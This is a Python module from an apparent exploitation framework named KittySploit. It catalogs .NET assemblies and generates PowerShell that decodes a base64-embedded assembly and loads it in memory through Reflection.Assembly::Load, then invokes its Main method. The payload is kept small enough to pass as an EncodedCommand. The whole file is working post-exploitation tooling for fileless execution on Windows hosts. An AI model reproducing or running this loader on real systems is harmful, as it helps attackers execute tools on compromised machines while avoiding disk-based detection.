#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""KittySploit .NET assembly catalog + in-memory load helpers."""

from __future__ import annotations

import base64
import json
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# EncodedCommand / cmdline safety: keep embedded payload small
DEFAULT_EMBED_MAX_BYTES = 4500


def assemblies_dir() -> Path:
    """Return ``data/assemblies`` under the framework root (created if missing)."""
    try:
        from core.utils.paths import framework_root

        root = framework_root()
    except Exception:
        root = None
    if root is None:
        root = Path(__file__).resolve().parents[3]
    path = root / "data" / "assemblies"
    path.mkdir(parents=True, exist_ok=True)
    return path


def catalog_path() -> Path:
    return assemblies_dir() / "catalog.json"


def load_catalog() -> Dict[str, Any]:
    path = catalog_path()
    if not path.is_file():
        return {"assemblies": []}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return {"assemblies": []}


def list_assemblies() -> List[Dict[str, Any]]:
    """Merge catalog.json entries with loose .exe/.dll files in the directory."""
    base = assemblies_dir()
    catalog = load_catalog()
    by_name: Dict[str, Dict[str, Any]] = {}

    for entry in catalog.get("assemblies") or []:
        if not isinstance(entry, dict):
            continue
        name = str(entry.get("name") or "").strip()
        if not name:
            continue
        filename = str(entry.get("file") or entry.get("filename") or "").strip()
        full = (base / filename) if filename else None
        by_name[name.lower()] = {
            "name": name,
            "file": filename,
            "path": str(full) if full and full.is_file() else "",
            "present": bool(full and full.is_file()),
            "description": str(entry.get("description") or ""),
            "default_args": str(entry.get("default_args") or ""),
            "type_name": str(entry.get("type_name") or ""),
            "method_name": str(entry.get("method_name") or "Main"),
            "source": "catalog",
        }

    for pattern in ("*.exe", "*.dll"):
        for pe in sorted(base.glob(pattern)):
            key = pe.stem.lower()
            if key in by_name:
                by_name[key]["path"] = str(pe)
                by_name[key]["present"] = True
                if not by_name[key].get("file"):
                    by_name[key]["file"] = pe.name
                continue
            by_name[key] = {
                "name": pe.stem,
                "file": pe.name,
                "path": str(pe),
                "present": True,
                "description": "Local assembly file",
                "default_args": "",
                "type_name": "",
                "method_name": "Main",
                "source": "filesystem",
            }

    return sorted(by_name.values(), key=lambda r: r["name"].lower())


def resolve_assembly(
    name_or_path: str,
    *,
    search_catalog: bool = True,
) -> Tuple[Path, Dict[str, Any]]:
    """Resolve a catalog name or filesystem path to an assembly file."""
    text = str(name_or_path or "").strip()
    if not text:
        raise FileNotFoundError("assembly name/path is empty")

    candidate = Path(text).expanduser()
    if candidate.is_file():
        return candidate.resolve(), {
            "name": candidate.stem,
            "file": candidate.name,
            "path": str(candidate.resolve()),
            "present": True,
            "description": "",
            "default_args": "",
            "type_name": "",
            "method_name": "Main",
            "source": "path",
        }

    if search_catalog:
        needle = text.lower()
        # strip extension for matching
        needle_stem = Path(needle).stem
        for entry in list_assemblies():
            if entry["name"].lower() == needle or entry["name"].lower() == needle_stem:
                if entry.get("path") and Path(entry["path"]).is_file():
                    return Path(entry["path"]), entry
                raise FileNotFoundError(
                    f"Catalog entry '{entry['name']}' found but file missing "
                    f"(place it in {assemblies_dir()})"
                )
            if entry.get("file") and entry["file"].lower() == Path(text).name.lower():
                if entry.get("path") and Path(entry["path"]).is_file():
                    return Path(entry["path"]), entry

        # Direct file under assemblies dir
        direct = assemblies_dir() / text
        if direct.is_file():
            return direct.resolve(), {
                "name": direct.stem,
                "file": direct.name,
                "path": str(direct.resolve()),
                "present": True,
                "description": "",
                "default_args": "",
                "type_name": "",
                "method_name": "Main",
                "source": "assemblies_dir",
            }

    raise FileNotFoundError(f"Assembly not found: {text}")


def _ps_quote(value: str) -> str:
    return str(value or "").replace("'", "''")


def build_invoke_script_from_b64(
    b64_payload: str,
    *,
    type_name: str = "",
    method_name: str = "Main",
    arguments: str = "",
) -> str:
    """PowerShell that loads assembly bytes from a base64 string and invokes Main."""
    tn = _ps_quote(type_name)
    mn = _ps_quote(method_name or "Main")
    args_ps = _ps_quote(arguments)
    resolve_type = (
        f"$type = $asm.GetType('{tn}')"
        if type_name
        else (
            "$type = $asm.GetTypes() | Where-Object { "
            "$_.GetMethod('Main', [typeof(string[])]) -or $_.GetMethod('Main') "
            "} | Select-Object -First 1"
        )
    )
    # Split b64 into chunks to keep line length sane inside the generated script
    chunk = 180
    parts = [b64_payload[i : i + chunk] for i in range(0, len(b64_payload), chunk)]
    joined = "+".join(f"'{p}'" for p in parts) if parts else "''"
    return f"""
$ErrorActionPreference = 'Stop'
$b64 = {joined}
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
{resolve_type}
if (-not $type) {{ throw 'Type not found' }}
$main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static,InvokeMethod')
if (-not $main) {{ $main = $type.GetMethod('{mn}', [Reflection.BindingFlags] 'Public,Static') }}
if (-not $main) {{ throw 'Method not found' }}
$argLine = '{args_ps}'
$params = $main.GetParameters()
if ($params.Count -eq 0) {{
  $main.Invoke($null, $null) | Out-String -Width 4096
}} elseif ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]) {{
  $argv = if ($argLine) {{ ,@($argLine -split ' ') }} else {{ ,@([string[]]@()) }}
  $main.Invoke($null, $argv) | Out-String -Width 4096
}} else {{
  throw 'Unsupported Main signature'
}}
"""


def build_invoke_from_bytes_script(
    assembly_bytes: bytes,
    *,
    type_name: str = "",
    method_name: str = "Main",
    arguments: str = "",
    embed_max_bytes: int = DEFAULT_EMBED_MAX_BYTES,
) -> Optional[str]:
    """Return an embeddable PS script, or None if the assembly is too large to embed."""
    if len(assembly_bytes) > int(embed_max_bytes):
        return None
    b64 = base64.b64encode(assembly_bytes).decode("ascii")
    return build_invoke_script_from_b64(
        b64,
        type_name=type_name,
        method_name=method_name,
        arguments=arguments,
    )


def is_dotnet_pe(data: bytes) -> bool:
    """Heuristic: PE with CLR runtime header."""
    if len(data) < 0x40 or data[:2] != b"MZ":
        return False
    try:
        e_lfanew = int.from_bytes(data[0x3C:0x40], "little")
        if data[e_lfanew : e_lfanew + 4] != b"PE\0\0":
            return False
        # Optional header magic
        opt = e_lfanew + 24
        magic = int.from_bytes(data[opt : opt + 2], "little")
        # CLR data directory index 14
        if magic == 0x10B:  # PE32
            clr_rva_off = opt + 208
        elif magic == 0x20B:  # PE32+
            clr_rva_off = opt + 224
        else:
            return False
        if clr_rva_off + 8 > len(data):
            return False
        clr_rva = int.from_bytes(data[clr_rva_off : clr_rva_off + 4], "little")
        return clr_rva != 0
    except Exception:
        return False
